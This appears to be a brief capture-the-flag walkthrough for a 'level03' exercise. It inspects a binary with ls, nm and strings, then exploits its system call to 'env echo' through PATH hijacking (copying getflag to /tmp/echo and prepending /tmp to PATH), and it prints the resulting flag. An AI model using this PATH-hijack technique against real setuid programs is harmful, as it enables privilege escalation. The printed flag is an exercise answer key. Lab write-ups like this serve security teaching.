#realise that the given level03 file had both read and executable rights for everyone
ls -la
#use nm and realize that it's calling system
nm level03
#use strings to find what command it may be calling
strings level03 #> /usr/bin/env echo Exploit me
#copy the getflag executable to tmp
cp /bin/getflag /tmp/echo
#add it to PATH
export PATH=/tmp/:$PATH
#call it
./level03 # > qi0maab88jeaj46qoumi7maus